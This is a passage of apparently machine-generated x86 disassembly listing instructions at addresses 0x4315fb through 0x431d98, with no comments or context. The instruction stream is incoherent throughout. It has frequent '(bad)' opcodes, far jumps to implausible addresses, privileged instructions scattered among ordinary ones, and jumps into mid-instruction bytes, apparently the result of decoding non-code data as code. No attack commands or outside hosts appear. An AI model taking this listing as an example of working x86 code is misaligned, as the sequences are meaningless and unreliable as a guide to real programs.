  4315fb:	inc    DWORD PTR [eax+0x4]
  4315fe:	push   ecx
  4315ff:	add    BYTE PTR [edx-0x1],dh
  431602:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431608:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  431612:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431618:	push   ecx
  431619:	cmp    BYTE PTR [ebx],al
  43161b:	inc    ebp
  43161c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  431622:	(bad)  
  431623:	(bad)  
  431624:	in     al,0xff
  431626:	add    BYTE PTR [ebp+0x0],al
  431629:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43162f:	add    al,bh
  431631:	(bad)  
  431632:	jmp    0x8d85:0x74b0558d
  431639:	dec    DWORD PTR [eax]
  43163b:	call   DWORD PTR [ebp-0x7b]
  43163e:	mov    edi,esi
  431640:	lock call DWORD PTR [ebp-0x75]
  431644:	mov    esi,esp
  431646:	mov    ah,0xc6
  431648:	mov    bh,0xc3
  43164a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431650:	add    DWORD PTR [eax],0x450050ff
  431656:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43165c:	inc    edi
  43165e:	push   esp
  431660:	jmp    0xcd00:0x660481ff
  431667:	mov    DWORD PTR [ebx],esi
  431669:	clc    
  43166a:	cmp    edi,0xff9cff3a
  431670:	jne    0x43167a
  431672:	mov    eax,eax
  431674:	add    esi,DWORD PTR [eax]
  431676:	int3   
  431677:	inc    ebp
  431678:	cmp    al,0x83
  43167a:	add    BYTE PTR [eax],bl
  43167c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431682:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431688:	mov    edi,eax
  43168a:	cmp    BYTE PTR [ebp+0x45],cl
  43168d:	jmp    0x43161a
  43168f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431692:	inc    ebp
  431693:	or     al,0x2
  431695:	dec    DWORD PTR [ebp+0x18]
  431698:	jne    0x4316ef
  43169a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4316a0:	mov    edi,DWORD PTR [ebx]
  4316a2:	in     al,0x50
  4316a4:	xchg   ecx,eax
  4316a5:	jmp    0x34365aa
  4316aa:	adc    al,0x8b
  4316ac:	inc    ebp
  4316ad:	mov    al,ds:0x8b04008b
  4316b2:	push   ebp
  4316b3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4316b9:	push   ebp
  4316ba:	test   DWORD PTR [ebx-0x2800d701],ecx
  4316c0:	inc    ebp
  4316c1:	dec    ebp
  4316c2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4316c8:	mov    DWORD PTR [eax],0xe9ff00f4
  4316ce:	add    al,0x0
  4316d0:	add    BYTE PTR [eax],al
  4316d2:	mov    eax,edx
  4316d4:	push   eax
  4316d5:	rol    DWORD PTR [ebp-0xf0177],1
  4316db:	bound  eax,QWORD PTR [ebp+0x50]
  4316de:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4316e4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4316ea:	mov    al,0xf
  4316ec:	test   DWORD PTR [edx],edx
  4316ee:	call   DWORD PTR [ebp-0x7a0001]
  4316f4:	(bad)  
  4316f5:	loop   0x4316f6
  4316f7:	jnp    0xc6990afd
  4316fd:	mov    eax,ebx
  4316ff:	cmp    al,0x8b
  431701:	(bad)  
  431702:	cld    
  431703:	shr    esi,0xc
  431706:	add    dl,al
  431708:	push   eax
  431709:	lea    eax,[ebp-0x1]
  43170c:	mov    edx,esi
  43170e:	cwde   
  43170f:	cli    
  431710:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431716:	or     BYTE PTR [eax],cl
  431718:	inc    ebp
  431719:	dec    ebp
  43171a:	inc    DWORD PTR [ebx+0x74803914]
  431720:	add    DWORD PTR [ebx+0x451800],ecx
  431726:	call   DWORD PTR [eax+edx*1]
  431729:	add    ecx,DWORD PTR [ebp-0x34]
  43172c:	push   edi
  43172d:	adc    al,0x8
  43172f:	mov    edx,DWORD PTR [ebp-0x14]
  431732:	mov    ecx,DWORD PTR [ebp+0x18]
  431735:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431739:	inc    DWORD PTR [eax+esi*8]
  43173c:	inc    ebp
  43173d:	stos   BYTE PTR es:[edi],al
  43173e:	mov    edx,DWORD PTR [ebp-0x4]
  431741:	add    DWORD PTR [ebp-0x1c],eax
  431744:	mov    edx,DWORD PTR [ebp-0x70]
  431747:	cmp    eax,DWORD PTR [eax]
  431749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43174a:	mov    eax,DWORD PTR [eax]
  43174c:	cld    
  43174d:	jae    0x4316cf
  43174f:	add    eax,DWORD PTR [ecx]
  431751:	clc    
  431752:	add    BYTE PTR [eax+0x30],dl
  431755:	mov    DWORD PTR [ecx],esi
  431757:	clc    
  431758:	pop    ds
  431759:	inc    ebp
  43175a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431760:	(bad)  
  431761:	push   DWORD PTR [edi]
  431763:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431769:	(bad)  
  43176a:	jae    0x43176b
  43176c:	mov    eax,DWORD PTR [ebp-0x740175]
  431772:	sub    eax,DWORD PTR [eax]
  431774:	add    eax,DWORD PTR [eax]
  431776:	mov    DWORD PTR [ecx+0x5f],eax
  431779:	mov    DWORD PTR [ebx-0x4],ebx
  43177c:	ret    0xff
  43177f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431785:	ret    
  431786:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43178c:	add    BYTE PTR [ebp-0x7d],al
  43178f:	mov    DWORD PTR [eax],eax
  431791:	add    al,0x84
  431793:	inc    DWORD PTR [ecx]
  431795:	lea    eax,[eax]
  431797:	hlt    
  431798:	sar    bh,cl
  43179a:	test   BYTE PTR [eax+0x1],dl
  43179d:	inc    ebp
  43179e:	add    BYTE PTR [ebx],dh
  4317a0:	test   BYTE PTR [ebx],0x84
  4317a3:	push   eax
  4317a4:	add    BYTE PTR [ebp+0x0],al
  4317a7:	add    eax,0x86
  4317ac:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4317b2:	add    BYTE PTR [ecx],al
  4317b4:	add    BYTE PTR [eax],al
  4317b6:	mov    esi,0x550030
  4317bb:	mov    ecx,DWORD PTR [edi]
  4317bd:	cld    
  4317be:	fidiv  DWORD PTR [ebp+0x0]
  4317c1:	mov    edi,DWORD PTR [ecx]
  4317c3:	xor    BYTE PTR [eax+eax*1],0x84
  4317c7:	add    eax,DWORD PTR [eax]
  4317c9:	sbb    BYTE PTR [eax],al
  4317cb:	jne    0x43177e
  4317cd:	mov    eax,DWORD PTR [ecx]
  4317cf:	sbb    BYTE PTR [eax],al
  4317d1:	mov    DWORD PTR [ebp-0x1],esp
  4317d4:	add    BYTE PTR [eax+0x30e45ca],bh
  4317da:	ret    0xb7fc
  4317dd:	dec    ebp
  4317de:	or     al,0x89
  4317e0:	dec    ebp
  4317e1:	cld    
  4317e2:	cmovne ecx,DWORD PTR [eax-0x75]
  4317e6:	add    edi,esp
  4317e8:	seto   BYTE PTR [esi-0x72ffffff]
  4317ef:	inc    ebp
  4317f0:	adc    al,0x8b
  4317f2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4317f9:	cmp    DWORD PTR [edi+0x72],edx
  4317fc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431802:	gs cmp al,0x0
  431805:	je     0x4317dd
  431807:	push   eax
  431808:	sar    BYTE PTR [eax],1
  43180a:	mov    bh,0x3e
  43180c:	push   cs
  43180d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431813:	add    DWORD PTR [ecx+0x12],ebp
  431816:	dec    edx
  431817:	(bad)  
  431818:	mov    eax,edx
  43181a:	in     al,dx
  43181b:	adc    DWORD PTR [ecx],esi
  43181d:	pop    esi
  43181e:	inc    ecx
  43181f:	leave  
  431820:	or     DWORD PTR [eax],ebx
  431822:	gs push ebp
  431824:	add    ah,ch
  431826:	into   
  431827:	in     al,dx
  431828:	enter  0xb756,0xf0
  43182c:	push   cs
  43182d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431837:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43183d:	jnp    0x74439d45
  431843:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431849:	add    BYTE PTR [edi],cl
  43184b:	mov    edi,DWORD PTR [ecx-0x78]
  43184e:	ltr    WORD PTR [ecx-0x7b]
  431852:	dec    DWORD PTR [edi]
  431854:	clc    
  431855:	out    0x45,eax
  431857:	add    BYTE PTR [eax],cl
  431859:	cmp    ebx,0xffffff8c
  43185c:	jge    0x43185e
  43185e:	jb     0x431870
  431860:	je     0x5218e0
  431866:	pop    edx
  431867:	push   esi
  431868:	mov    ecx,DWORD PTR [edi]
  43186a:	in     al,dx
  43186b:	rol    DWORD PTR [ebp+0x0],1
  43186e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431875:	cmp    DWORD PTR [ecx],0xfffffff0
  431878:	hlt    
  431879:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43187f:	(bad)  
  431881:	push   eax
  431882:	jns    0xb842fd00
  431888:	lock push cs
  43188a:	ror    edx,0x3
  43188d:	test   BYTE PTR [ecx+0x5500e800],cl
  431893:	dec    eax
  431894:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431898:	(bad)  
  431899:	mov    esi,0x7f33ff5f
  43189e:	inc    eax
  43189f:	test   DWORD PTR [edx],eax
  4318a1:	je     0x431863
  4318a3:	mov    ecx,ecx
  4318a5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4318a9:	and    eax,DWORD PTR [eax+0xf0103]
  4318af:	jp     0x43189d
  4318b1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4318b5:	add    edx,DWORD PTR [edi+0x74]
  4318b8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4318be:	add    BYTE PTR [ebp-0x74c48bbb],al
  4318c4:	je     0x431849
  4318c6:	cmp    eax,edi
  4318c8:	js     0x4318ed
  4318ca:	add    eax,0xeb0fc003
  4318cf:	jns    0x43185c
  4318d1:	vmread DWORD PTR [ecx+0x45],ebx
  4318d5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4318db:	adc    al,0x8b
  4318dd:	jge    0x4318f3
  4318df:	mov    edi,DWORD PTR [eax-0x4]
  4318e2:	add    edi,DWORD PTR [edi]
  4318e4:	or     bh,bh
  4318e6:	push   ebp
  4318e7:	push   es
  4318e8:	mov    DWORD PTR [ebp-0x4],ebx
  4318eb:	add    edi,esi
  4318ed:	pop    es
  4318ee:	add    esi,DWORD PTR [edi-0x48ccf183]
  4318f4:	mov    DWORD PTR [esp+esi*8],ecx
  4318f7:	inc    ebp
  4318f8:	pop    ebp
  4318f9:	xor    DWORD PTR [esi-0x4],0x3b
  4318fd:	add    edx,DWORD PTR [ecx+edi*1]
  431900:	push   es
  431901:	clc    
  431902:	mov    bh,0xdb
  431904:	jp     0x4318bd
  431906:	add    cl,BYTE PTR [esi]
  431908:	div    DWORD PTR [edi+0x4d8b0c1c]
  43190e:	test   edi,edi
  431910:	je     0x431906
  431912:	mov    eax,ecx
  431914:	or     BYTE PTR [ebx],al
  431916:	dec    BYTE PTR [ecx+0x7d3bec7d]
  43191c:	jbe    0x431990
  43191e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431924:	add    ecx,DWORD PTR [esi]
  431926:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  43192c:	add    eax,DWORD PTR [ebx-0x287af783]
  431932:	je     0x431981
  431934:	mov    DWORD PTR [ecx],edi
  431936:	mov    esi,eax
  431938:	hlt    
  431939:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431940:	jb     0x431902
  431942:	jmp    0x43192f
  431944:	xor    esi,DWORD PTR [ebx]
  431946:	pop    edi
  431947:	pop    esi
  431948:	pop    ebx
  431949:	ret    
  43194a:	ret    0x8b
  43194d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431953:	xor    DWORD PTR ds:0x89339c0c,0x56
  43195a:	cld    
  43195b:	cmp    DWORD PTR [ebp+0xf],eax
  43195e:	xor    al,0x85
  431960:	pushf  
  431961:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  431967:	ret    
  431968:	mov    edi,DWORD PTR [esi-0x4]
  43196b:	pop    eax
  43196c:	dec    ebp
  43196d:	jne    0x4318fa
  43196f:	xor    edi,esp
  431971:	inc    eax
  431972:	dec    ebp
  431973:	jbe    0x4319c8
  431975:	inc    eax
  431976:	pop    ebp
  431977:	add    edx,DWORD PTR [esi+0x8]
  43197a:	push   ebx
  43197b:	dec    eax
  43197c:	push   ecx
  43197d:	mov    eax,edi
  43197f:	and    al,0xf0
  431981:	jo     0x43196e
  431983:	mov    eax,DWORD PTR [ebx]
  431985:	sbb    BYTE PTR [ebp+0x4d],cl
  431988:	mov    eax,DWORD PTR [ebx]
  43198a:	nop
  43198b:	or     BYTE PTR [eax],al
  43198d:	jne    0x4319e6
  43198f:	cmp    ebx,DWORD PTR [edx+0x33893277]
  431995:	cld    
  431996:	xor    edi,edi
  431998:	add    edi,DWORD PTR [ebp+0x3]
  43199b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4319a1:	js     0x431927
  4319a3:	jae    0x4319a7
  4319a5:	(bad)  
  4319a7:	xor    al,0x5d
  4319a9:	jmp    0x431936
  4319ab:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4319b2:	fdecstp 
  4319b4:	test   BYTE PTR [edi],ah
  4319b6:	add    bh,BYTE PTR [ebp+0x0]
  4319b9:	add    ebx,DWORD PTR [ebp-0x77]
  4319bc:	mov    edi,eax
  4319be:	cmp    al,0x0
  4319c1:	adc    dh,BYTE PTR [ebx]
  4319c3:	jge    0x4319c8
  4319c5:	mov    edi,DWORD PTR [ebx]
  4319c7:	jl     0x4319d8
  4319c9:	clc    
  4319ca:	dec    edi
  4319cb:	jge    0x4319cd
  4319cd:	mov    eax,DWORD PTR [ebx]
  4319cf:	jb     0x4319d9
  4319d1:	mov    ecx,DWORD PTR [ebp-0x8]
  4319d4:	mov    edi,edi
  4319d6:	xor    edx,DWORD PTR [eax]
  4319d8:	add    edi,DWORD PTR [ebx]
  4319da:	mov    DWORD PTR [ebp-0x10],edi
  4319dd:	inc    edi
  4319de:	pop    ebp
  4319df:	jge    0x431a1c
  4319e1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  4319e5:	mov    edx,0xc05d87f0
  4319ea:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  4319ee:	fimul  WORD PTR [eax]
  4319f0:	fist   WORD PTR [ebp+0x1c]
  4319f3:	in     al,dx
  4319f4:	jne    0x4319e2
  4319f6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  4319fc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431a00:	fdivp  st(0),st
  431a02:	fild   WORD PTR [ebp+0x4510f85c]
  431a08:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431a0e:	inc    ebp
  431a0f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431a15:	mov    ebp,DWORD PTR [ebx-0x4]
  431a18:	adc    al,0x8b
  431a1a:	rcl    DWORD PTR [eax],0x48
  431a1d:	mov    esi,0x7080803
  431a22:	fiadd  WORD PTR [ebp+0x4d]
  431a25:	(bad)  
  431a26:	mov    edx,DWORD PTR [edx-0x4]
  431a29:	mov    edx,DWORD PTR [ebp-0x4]
  431a2c:	xor    ebx,DWORD PTR [ebx+0x330103]
  431a32:	mov    DWORD PTR [edi+0x872dc],edi
  431a38:	xlat   BYTE PTR ds:[ebx]
  431a39:	into   
  431a3a:	ffreep st(6)
  431a3c:	retf   0x6c7
  431a3f:	iret   
  431a40:	dec    ebp
  431a41:	inc    ebp
  431a42:	mov    DWORD PTR [ebx],edi
  431a44:	fmul   QWORD PTR [edi]
  431a46:	dec    ebp
  431a47:	jnp    0x431a7c
  431a49:	add    BYTE PTR [ebx],al
  431a4b:	mov    ecx,DWORD PTR [esp+edi*8]
  431a4e:	inc    ebp
  431a4f:	dec    ebp
  431a50:	lea    esi,[ebx]
  431a52:	add    DWORD PTR [ebx],eax
  431a54:	jb     0x431a91
  431a56:	add    BYTE PTR [edi],cl
  431a58:	inc    ebp
  431a59:	imul   eax,edi,0x858bd800
  431a5f:	cld    
  431a60:	clc    
  431a61:	mov    DWORD PTR [ebp+0x0],eax
  431a64:	inc    DWORD PTR [eax]
  431a66:	or     al,0xde
  431a68:	sbb    bh,0x1
  431a6b:	retf   
  431a6c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431a73:	dec    ebp
  431a74:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431a7a:	enter  0x12de,0xdf
  431a7e:	inc    ebp
  431a7f:	pop    ebp
  431a80:	dec    DWORD PTR [ebx-0x257f0ff4]
  431a86:	add    DWORD PTR [edx],edx
  431a88:	add    BYTE PTR [ebp+0x50],dl
  431a8b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431a91:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  431a98:	loopne 0x431ab1
  431a9a:	cdq    
  431a9b:	push   ebp
  431a9c:	clc    
  431a9d:	mov    eax,DWORD PTR [ebp-0x4]
  431aa0:	xor    edx,edx
  431aa2:	add    esi,DWORD PTR [ebx]
  431aa4:	cmp    eax,DWORD PTR [ebx]
  431aa6:	hlt    
  431aa7:	cmp    DWORD PTR [ebx],esp
  431aa9:	or     al,BYTE PTR [ebp+0xf]
  431aac:	mov    eax,DWORD PTR [edx]
  431aae:	loopne 0x431ab0
  431ab0:	(bad)  
  431ab1:	mov    ecx,esi
  431ab3:	cld    
  431ab4:	pushf  
  431ab5:	pop    ebp
  431ab6:	call   0x10c0:0x8bf0328b
  431abd:	add    eax,DWORD PTR [eax+0x10018b]
  431ac3:	dec    ebp
  431ac4:	iret   
  431ac5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431acb:	dec    ebp
  431acc:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ad2:	(bad)  
  431ad3:	iret   
  431ad4:	inc    ebp
  431ad5:	(bad)  
  431ad6:	jne    0x431b25
  431ad8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431ade:	(bad)  
  431adf:	cmp    ebx,eax
  431ae1:	je     0x431a69
  431ae3:	add    edi,edi
  431ae5:	or     bh,bh
  431ae7:	dec    ebp
  431ae8:	inc    ebp
  431ae9:	mov    esi,DWORD PTR [ebx]
  431aeb:	cld    
  431aec:	add    ecx,esi
  431aee:	cmp    ecx,DWORD PTR [eax-0xc]
  431af1:	mov    edx,DWORD PTR [edi]
  431af3:	or     BYTE PTR [ebp-0x7c],al
  431af6:	mov    ebx,DWORD PTR [edx-0x7639cd18]
  431afc:	test   BYTE PTR [edx+ebx*4],cl
  431aff:	inc    ebp
  431b00:	xor    bh,BYTE PTR [eax]
  431b02:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431b09:	jne    0x431ad2
  431b0b:	mov    ebp,esp
  431b0d:	fcomp  DWORD PTR [ebx]
  431b0f:	add    BYTE PTR [ecx],al
  431b11:	inc    DWORD PTR [ebp-0x75]
  431b14:	(bad)  
  431b15:	cld    
  431b16:	add    al,0xce
  431b18:	mov    ecx,edi
  431b1a:	cld    
  431b1b:	inc    ebp
  431b1c:	fidivr WORD PTR [ebx]
  431b1e:	fbstp  TBYTE PTR [ebp-0x3e]
  431b21:	mov    eax,DWORD PTR [eax]
  431b23:	adc    BYTE PTR [ebx-0x3974038b],cl
  431b29:	fadd   st,st(7)
  431b2b:	add    BYTE PTR [ebp-0x1],al
  431b2e:	mov    ecx,DWORD PTR [esp+edi*8]
  431b31:	inc    ebp
  431b32:	mov    bh,0xc7
  431b35:	loopne 0x431b7c
  431b37:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431b3d:	sbb    al,0x33
  431b3f:	pushf  
  431b40:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431b46:	mov    eax,edi
  431b48:	cwde   
  431b49:	inc    ebp
  431b4a:	inc    ebp
  431b4b:	jne    0x431ad8
  431b4d:	mov    esp,esp
  431b4f:	clc    
  431b50:	add    al,0x4d
  431b52:	mov    DWORD PTR [ebx],esi
  431b54:	or     al,0x33
  431b56:	inc    ebp
  431b57:	lea    ecx,[ebx-0x398d13fd]
  431b5d:	add    bh,al
  431b5f:	inc    ebp
  431b60:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431b67:	add    ebp,esp
  431b69:	shufps xmm1,xmm3,0xc7
  431b6d:	(bad)  
  431b6e:	jmp    0x74885697
  431b73:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431b79:	hlt    
  431b7a:	mov    ecx,DWORD PTR [edi]
  431b7c:	fadd   DWORD PTR [ebp+0x0]
  431b7f:	xor    ecx,DWORD PTR [edi]
  431b81:	add    ecx,ecx
  431b83:	cmp    edi,edi
  431b85:	pmuludq mm7,QWORD PTR [edx+0x50]
  431b89:	(bad)  
  431b8a:	jmp    0x431b17
  431b8c:	mov    edi,esp
  431b8e:	or     al,0xc6
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	mov    eax,DWORD PTR [ebp+0x10]
  431b95:	jne    0x431b20
  431b97:	mov    eax,DWORD PTR [ecx]
  431b99:	clc    
  431b9a:	add    BYTE PTR [ebp-0x40],cl
  431b9d:	xor    edx,DWORD PTR [eax-0x73]
  431ba0:	jne    0x431ba3
  431ba2:	push   DWORD PTR [edx+0x8]
  431ba5:	add    BYTE PTR [ebp+0x45],al
  431ba8:	mov    ebp,ecx
  431baa:	cld    
  431bab:	add    BYTE PTR [ebp+0x0],cl
  431bae:	xor    eax,DWORD PTR [ebp+0x3]
  431bb1:	lea    edi,[ebx]
  431bb3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431bb9:	sub    eax,0x5d330e4d
  431bbe:	lea    esi,[ebx]
  431bc0:	add    DWORD PTR [ebx],eax
  431bc2:	jb     0x431bad
  431bc4:	add    BYTE PTR [eax],al
  431bc6:	inc    ebp
  431bc7:	add    bl,ch
  431bc9:	inc    ebp
  431bca:	mov    esi,DWORD PTR [ebx]
  431bcc:	or     al,0x3
  431bce:	(bad)  
  431bcf:	mov    edi,eax
  431bd1:	in     al,dx
  431bd2:	scas   eax,DWORD PTR es:[edi]
  431bd3:	inc    ebp
  431bd4:	mov    esi,DWORD PTR [ebx]
  431bd6:	in     al,0x3
  431bd8:	add    al,0x89
  431bda:	mov    ecx,DWORD PTR [eax+edi*8]
  431bdd:	dec    ebp
  431bde:	(bad)  
  431bdf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3166]
  431be6:	mov    ecx,eax
  431be8:	cld    
  431be9:	push   es
  431bea:	dec    ebp
  431beb:	add    al,0x33
  431bed:	mov    DWORD PTR [ebx],eax
  431bef:	in     al,dx
  431bf0:	cmp    DWORD PTR [ebp-0x67],eax
  431bf3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431bff:	xor    eax,DWORD PTR [ebp+0x3]
  431c02:	cmp    DWORD PTR [ebx],0x8b327499
  431c08:	xor    edi,esp
  431c0a:	jmp    0xff77195c
  431c0f:	add    ecx,DWORD PTR [ebp-0x3f]
  431c12:	xor    ebx,DWORD PTR [edi]
  431c14:	add    eax,ecx
  431c16:	cmp    ebx,DWORD PTR [eax]
  431c18:	mov    ecx,DWORD PTR [ebp-0x4]
  431c1b:	mov    ecx,DWORD PTR [eax]
  431c1d:	adc    BYTE PTR [ebp-0x80],al
  431c20:	jmp    0x431c23
  431c22:	mov    eax,DWORD PTR [eax]
  431c24:	cld    
  431c25:	mov    bh,0xc6
  431c27:	push   ecx
  431c28:	(bad)  
  431c29:	jne    0x431c89
  431c2b:	dec    ecx
  431c2d:	or     BYTE PTR [ecx+ebx*1],cl
  431c30:	push   ebp
  431c31:	inc    ebp
  431c32:	in     al,dx
  431c33:	add    ebp,esp
  431c35:	or     bh,al
  431c37:	dec    ebp
  431c38:	cld    
  431c39:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431c3f:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  431c43:	dec    DWORD PTR [ebx+0x45510cf4]
  431c49:	mov    DWORD PTR [ebx+0x5345fc0c],ecx
  431c4f:	mov    edx,DWORD PTR [ecx+0xc]
  431c52:	xor    eax,esi
  431c54:	mov    edx,0xc172c7
  431c59:	inc    ebp
  431c5a:	mov    esi,DWORD PTR [ebp+0x8]
  431c5d:	mov    eax,edx
  431c5f:	call   0x84c7e354
  431c64:	add    DWORD PTR [edx-0x76bace00],ebx
  431c6a:	mov    ebp,eax
  431c6c:	or     BYTE PTR [eax],dl
  431c6e:	jo     0x431cbd
  431c70:	push   edi
  431c71:	xor    esi,DWORD PTR [ebp+0x3]
  431c74:	(bad)  
  431c75:	pmulhuw mm0,mm1
  431c78:	test   DWORD PTR [ebp-0x8],ecx
  431c7b:	mov    DWORD PTR [ebp-0x67],eax
  431c7e:	mov    eax,DWORD PTR [ebp-0x4]
  431c81:	xor    edi,DWORD PTR [ebp-0x73]
  431c84:	xor    eax,DWORD PTR [ebx]
  431c86:	xor    esi,DWORD PTR [edx+0x3]
  431c89:	add    BYTE PTR [ecx],bh
  431c8b:	inc    ebp
  431c8c:	(bad)  
  431c8d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431c93:	mov    DWORD PTR [eax],0x750f0004
  431c99:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431c9f:	lock add BYTE PTR [ebp+0x0],cl
  431ca3:	mov    esi,DWORD PTR [ebp-0x18]
  431ca6:	mov    ebp,edx
  431ca8:	or     al,0x72
  431caa:	ja     0x431cac
  431cac:	mov    edx,esi
  431cae:	cld    
  431caf:	(bad)  
  431cb2:	cli    
  431cb3:	mov    esi,DWORD PTR [ebp-0x4]
  431cb6:	cmp    ecx,esi
  431cb8:	bswap  edi
  431cba:	(bad)
  431cbe:	mov    esi,DWORD PTR [ebp-0x4]
  431cc1:	mov    esi,ecx
  431cc3:	clc    
  431cc4:	repnz add esi,DWORD PTR [ebp+0x45]
  431cc8:	push   ebx
  431cc9:	xor    eax,DWORD PTR [ebp+0x3]
  431ccc:	cmp    bl,BYTE PTR [edi-0x64]
  431ccf:	pop    ebx
  431cd0:	jmp    0x431d97
  431cd5:	mov    esi,DWORD PTR [ebp-0x7d]
  431cd8:	xor    ebp,DWORD PTR [eax]
  431cda:	lea    eax,[ebp-0x8]
  431cdd:	xor    eax,0xc7ef9cf2
  431ce2:	neg    eax
  431ce4:	ins    DWORD PTR es:[edi],dx
  431ce5:	test   esi,edi
  431ce7:	clc    
  431ce8:	pop    esp
  431ce9:	inc    ebp
  431cea:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431cf0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431cf6:	add    cl,al
  431cf8:	jne    0x431c94
  431cfa:	mov    esi,DWORD PTR [edx]
  431cfc:	in     al,dx
  431cfd:	push   esi
  431cfe:	xor    BYTE PTR [ebp-0xe],dh
  431d01:	add    edi,esi
  431d03:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431d09:	add    cl,bh
  431d0b:	mov    edi,DWORD PTR [ebp+0x8]
  431d0e:	mov    DWORD PTR [ebp-0x14],esi
  431d11:	add    esi,DWORD PTR [ebp+0x3c]
  431d14:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431d1a:	mov    ah,0x38
  431d1c:	call   0xe0e4:0x898b329c
  431d23:	jne    0x431d9a
  431d25:	mov    ecx,DWORD PTR [ebx-0xe0e13f4]
  431d2b:	shl    edx,0xf2
  431d2e:	(bad)  
  431d2f:	mov    ah,0x16
  431d31:	dec    eax
  431d32:	jne    0x431cc7
  431d34:	mov    ecx,DWORD PTR [edi]
  431d36:	in     al,dx
  431d37:	jmp    0x431d2a
  431d39:	add    dl,dh
  431d3b:	mov    edi,esi
  431d3d:	or     al,0x8
  431d3f:	inc    ebp
  431d40:	jne    0x431d45
  431d42:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431d48:	ret    
  431d49:	or     bh,bh
  431d4b:	jge    0x431d35
  431d4d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431d53:	xor    edi,eax
  431d55:	add    esi,DWORD PTR [ebp-0x77]
  431d58:	mov    ebx,esp
  431d5a:	clc    
  431d5b:	neg    DWORD PTR [ebp-0x7c]
  431d5e:	xor    eax,DWORD PTR [eax]
  431d60:	cmp    eax,DWORD PTR [eax]
  431d62:	repz jne 0x431cfa
  431d65:	xor    eax,DWORD PTR [ecx]
  431d67:	add    ebx,DWORD PTR [eax]
  431d69:	mov    DWORD PTR [ebp-0x8],eax
  431d6c:	mov    eax,edi
  431d6e:	cld    
  431d6f:	lock pop eax
  431d71:	test   DWORD PTR [ebx],esi
  431d73:	clc    
  431d74:	add    edx,DWORD PTR [edi-0x740bff77]
  431d7a:	fdivp  st(4),st
  431d7c:	test   ecx,esi
  431d7e:	(bad)  
  431d7f:	jnp    0x431d80
  431d81:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431d87:	jae    0x431d14
  431d89:	sub    edi,esp
  431d8b:	(bad)  
  431d8c:	shl    DWORD PTR [eax-0x3e],0x89
  431d90:	leave  
  431d91:	call   0x8198d49e
  431d96:	in     al,dx
  431d97:	(bad)  
  431d98:	in     al,dx
